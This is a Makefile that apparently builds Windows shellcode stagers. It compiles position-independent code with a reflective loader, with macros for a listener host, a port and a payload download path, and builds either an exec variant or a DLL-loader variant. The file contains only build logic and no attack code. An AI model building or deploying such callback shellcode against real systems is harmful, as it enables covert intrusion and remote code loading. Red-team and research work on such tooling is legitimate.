CCX64 = x86_64-w64-mingw32-g++
CCX86 = i686-w64-mingw32-g++

MACROS = -DLISTENER_HOST=\"$(LISTENER_HOST)\" -DLISTENER_PORT=$(LISTENER_PORT)
MACROS += -DREQUEST_PATH_DOWNLOAD=\"$(REQUEST_PATH_DOWNLOAD)\"

CFLAGS = -g $(MACROS)
CFLAGS += -Os -masm=intel -nostdlib
CFLAGS += -s -ffunction-sections -fno-ident -fno-asynchronous-unwind-tables -w
CFLAGS += -fpack-struct=8 -falign-labels=1 -falign-jumps=1 -fPIC
CFLAGS += -Wl,-Tscript/linker.ld
CFLAGS += -Wl,-s,--no-seh,--enable-stdcall-fixup

ifeq ($(SHELLCODE_TYPE),exec)
	SOURCE = src/core/*.cpp src/main/entry_exec.cpp
else ifeq ($(SHELLCODE_TYPE),dll-loader)
	SOURCE = src/core/*.cpp src/main/entry_dll_loader.cpp
endif

OUTTEMP = build/tmp.dll
OUTFILE = ${OUTPUT}

amd64: clean
	@ nasm -f win64 -o build/rfl.o src/asm/rfl.x64.asm
	@ $(CCX64) -o $(OUTTEMP) $(CFLAGS) -Iinclude $(SOURCE) build/rfl.o
	# @ objcopy -O binary --only-section=.text $(OUTTEMP) $(OUTFILE)
	@ python3 script/extract.py -f $(OUTTEMP) -o $(OUTFILE)

i686: clean
	@ nasm -f win32 -o build/rfl.o src/asm/rfl.x86.asm
	@ $(CCX86) -o $(OUTTEMP) $(CFLAGS) -Iinclude $(SOURCE) build/rfl.o
	# @ objcopy -O binary --only-section=.text $(OUTTEMP) $(OUTFILE)
	@ python3 script/extract.py -f $(OUTTEMP) -o $(OUTFILE)

clean:
	@ rm -rf build/*
